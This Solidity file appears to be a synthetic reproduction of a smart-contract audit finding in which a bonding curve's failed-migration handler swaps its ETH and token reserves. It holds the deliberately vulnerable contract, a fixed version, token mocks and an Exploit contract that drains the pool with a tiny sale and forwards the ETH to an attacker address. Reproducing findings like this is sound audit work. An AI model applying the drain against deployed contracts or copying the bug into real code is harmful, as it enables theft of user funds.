// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of g8keep finding 64999 (H-02):
// "Incorrect reserve assignment leads to reserve mismatch and fund
//  mismanagement" in g8keepBondingCurve::_handleMigrationFailed.
//
// The bonding curve stores its virtual pricing reserves in a packed struct
//   bReserve { uint112 reserve0; uint112 reserve1 }
// where, by the curve's own convention, reserve0 is the ETH reserve and
// reserve1 is the token reserve. On a FAILED migration the handler is supposed
// to reset the reserves to the curve's real balances (ethAmount, tokenAmount)
// so trading can resume at a fair price. Instead it assigns them SWAPPED:
//     bReserve.reserve0 = tokenAmount;      // ETH slot  <- token amount  (BUG)
//     bReserve.reserve1 = uint112(ethAmount);// token slot <- ETH amount  (BUG)
//
// With ethAmount = 1 ETH and tokenAmount = 1,000,000 tokens, the swap inflates
// the ETH reserve to 1e24 (pricing believes the pool holds 1,000,000 ETH) while
// the pool actually holds only 1 ETH. The constant-product sell price is thus
// inverted ~1e12x: an attacker selling a microscopic token amount computes an
// ETH payout that drains the curve's ENTIRE real ETH balance.
//
// FIDELITY NOTE: the verbatim vulnerable function body (below, marked `// @>`)
// is reproduced byte-for-byte from the finding. The constant-product buy()/
// sell() math is NOT embedded in the finding and is reconstructed here as a
// standard x*y=k model over reserve0(ETH)/reserve1(token) — this is the only
// modeled part; the reserve-swap bug and its price-inversion harm are faithful.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal WETH interface, matching the verbatim call in the handler:
///      `WETH.withdraw(WETH.balanceOf(address(this)))`.
interface IWETH {
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
}

/// @dev Minimal faithful WETH double (deposit / withdraw / transfer).
contract WETH9 {
    string public constant name = "Wrapped Ether";
    string public constant symbol = "WETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function withdraw(uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "weth withdraw fail");
    }

    receive() external payable {
        balanceOf[msg.sender] += msg.value;
    }
}

/// @dev Minimal ERC20 double for the project token traded on the curve.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE curve: verbatim `_handleMigrationFailed` (reserve slots SWAPPED),
// plus a reconstructed constant-product buy/sell over reserve0(ETH)/reserve1(token).
// ─────────────────────────────────────────────────────────────────────────────
contract g8keepBondingCurve {
    struct BondingReserve {
        uint112 reserve0; // ETH reserve (by curve convention)
        uint112 reserve1; // token reserve (by curve convention)
    }

    uint256 internal constant STATUS_MIGRATION_FAILED_FLAG = 2;

    IWETH public WETH;
    MiniToken public token;
    uint256 public curveStatus;
    BondingReserve public bReserve;

    event MigrationFailed();

    constructor(address _token, address _weth) {
        token = MiniToken(_token);
        WETH = IWETH(_weth);
    }

    // ── verbatim vulnerable function (imports/pragma stripped; body unchanged) ──
    function _handleMigrationFailed(uint256 ethAmount, uint112 tokenAmount) internal {
        curveStatus = curveStatus | STATUS_MIGRATION_FAILED_FLAG;
        WETH.withdraw(WETH.balanceOf(address(this)));

        bReserve.reserve0 = tokenAmount;        // @> ETH reserve slot wrongly receives the TOKEN amount
        bReserve.reserve1 = uint112(ethAmount); // @> token reserve slot wrongly receives the ETH amount

        emit MigrationFailed();
    }

    /// @notice Thin external hook to reach the internal verbatim handler.
    function triggerMigrationFailed(uint256 ethAmount, uint112 tokenAmount) external {
        _handleMigrationFailed(ethAmount, tokenAmount);
    }

    /// @notice Reconstructed constant-product buy: pay ETH, receive tokens.
    function buy() external payable returns (uint256 tokensOut) {
        uint256 r0 = uint256(bReserve.reserve0); // ETH reserve
        uint256 r1 = uint256(bReserve.reserve1); // token reserve
        uint256 k = r0 * r1;
        uint256 newR0 = r0 + msg.value;
        tokensOut = r1 - (k / newR0);
        bReserve.reserve0 = uint112(newR0);
        bReserve.reserve1 = uint112(r1 - tokensOut);
        token.transfer(msg.sender, tokensOut);
    }

    /// @notice Reconstructed constant-product sell: pay tokens, receive ETH.
    ///         reserve0 is priced as the ETH reserve, reserve1 as the token reserve.
    function sell(uint256 tokenIn) external returns (uint256 ethOut) {
        token.transferFrom(msg.sender, address(this), tokenIn);
        uint256 r0 = uint256(bReserve.reserve0); // ETH reserve
        uint256 r1 = uint256(bReserve.reserve1); // token reserve
        uint256 k = r0 * r1;
        uint256 newR1 = r1 + tokenIn;
        ethOut = r0 - (k / newR1);
        bReserve.reserve0 = uint112(r0 - ethOut);
        bReserve.reserve1 = uint112(newR1);
        // A pool can never pay out more ETH than it actually holds.
        uint256 bal = address(this).balance;
        if (ethOut > bal) ethOut = bal;
        (bool ok,) = msg.sender.call{value: ethOut}("");
        require(ok, "eth transfer failed");
    }

    receive() external payable {}
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED curve: identical, but `_handleMigrationFailed` assigns reserves correctly
// (reserve0 = ethAmount, reserve1 = tokenAmount) per the finding's recommendation.
// ─────────────────────────────────────────────────────────────────────────────
contract g8keepBondingCurveFixed {
    struct BondingReserve {
        uint112 reserve0;
        uint112 reserve1;
    }

    uint256 internal constant STATUS_MIGRATION_FAILED_FLAG = 2;

    IWETH public WETH;
    MiniToken public token;
    uint256 public curveStatus;
    BondingReserve public bReserve;

    event MigrationFailed();

    constructor(address _token, address _weth) {
        token = MiniToken(_token);
        WETH = IWETH(_weth);
    }

    function _handleMigrationFailed(uint256 ethAmount, uint112 tokenAmount) internal {
        curveStatus = curveStatus | STATUS_MIGRATION_FAILED_FLAG;
        WETH.withdraw(WETH.balanceOf(address(this)));

        bReserve.reserve0 = uint112(ethAmount); // FIX: ETH reserve <- ETH amount
        bReserve.reserve1 = tokenAmount;        // FIX: token reserve <- token amount

        emit MigrationFailed();
    }

    function triggerMigrationFailed(uint256 ethAmount, uint112 tokenAmount) external {
        _handleMigrationFailed(ethAmount, tokenAmount);
    }

    function buy() external payable returns (uint256 tokensOut) {
        uint256 r0 = uint256(bReserve.reserve0);
        uint256 r1 = uint256(bReserve.reserve1);
        uint256 k = r0 * r1;
        uint256 newR0 = r0 + msg.value;
        tokensOut = r1 - (k / newR0);
        bReserve.reserve0 = uint112(newR0);
        bReserve.reserve1 = uint112(r1 - tokensOut);
        token.transfer(msg.sender, tokensOut);
    }

    function sell(uint256 tokenIn) external returns (uint256 ethOut) {
        token.transferFrom(msg.sender, address(this), tokenIn);
        uint256 r0 = uint256(bReserve.reserve0);
        uint256 r1 = uint256(bReserve.reserve1);
        uint256 k = r0 * r1;
        uint256 newR1 = r1 + tokenIn;
        ethOut = r0 - (k / newR1);
        bReserve.reserve0 = uint112(r0 - ethOut);
        bReserve.reserve1 = uint112(newR1);
        uint256 bal = address(this).balance;
        if (ethOut > bal) ethOut = bal;
        (bool ok,) = msg.sender.call{value: ethOut}("");
        require(ok, "eth transfer failed");
    }

    receive() external payable {}
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: the curve holds 1 ETH of PROTOCOL/user funds (staged by the
// Exploit contract, NOT the attacker). A failed migration swaps the reserves.
// The attacker — holding only a microscopic token position — sells it and, at
// the inverted price, drains the curve's entire 1 ETH to the attacker EOA.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant ETH_AMOUNT = 1e18;         // real ETH the curve holds (protocol funds)
    uint112 internal constant TOKEN_AMOUNT = 1e24;       // token side of the (mis)assigned reserves
    uint256 internal constant SELL_AMOUNT = 1e12;        // attacker's tiny token position (0.000001 token)

    // Exposed results for the driver / Playground.
    address public curveAddr;
    address public tokenAddr;
    address public wethAddr;
    uint256 public ethDrained;

    function run() external payable {
        require(address(this).balance >= ETH_AMOUNT, "seed protocol ETH first");

        // --- deploy the curve + doubles (fixed order; index 0 = first new) ---
        MiniToken token = new MiniToken("g8keep", "G8K");       // deploy 0
        WETH9 weth = new WETH9();                                // deploy 1
        g8keepBondingCurve curve = new g8keepBondingCurve(address(token), address(weth)); // deploy 2

        curveAddr = address(curve);
        tokenAddr = address(token);
        wethAddr = address(weth);

        // --- seed the curve with 1 ETH of PROTOCOL funds, held as WETH ---
        weth.deposit{value: ETH_AMOUNT}();
        weth.transfer(address(curve), ETH_AMOUNT);

        // --- a migration fails: the handler SWAPS the reserves (the bug) ---
        // curve withdraws its WETH -> holds ETH_AMOUNT native ETH;
        // bReserve becomes reserve0=TOKEN_AMOUNT (1e24), reserve1=ETH_AMOUNT (1e18).
        curve.triggerMigrationFailed(ETH_AMOUNT, TOKEN_AMOUNT);

        // --- attacker holds a microscopic token position and sells it ---
        token.mint(address(this), SELL_AMOUNT);
        token.approve(address(curve), SELL_AMOUNT);
        uint256 got = curve.sell(SELL_AMOUNT);
        ethDrained = got;

        // --- harm: forward the drained ETH to the attacker EOA ---
        (bool ok,) = ATTACKER.call{value: address(this).balance}("");
        require(ok, "forward to attacker failed");

        // The tiny sell drained essentially the whole 1 ETH pool.
        require(ATTACKER.balance >= (ETH_AMOUNT * 9) / 10, "drain did not materialize");
    }

    receive() external payable {}
}
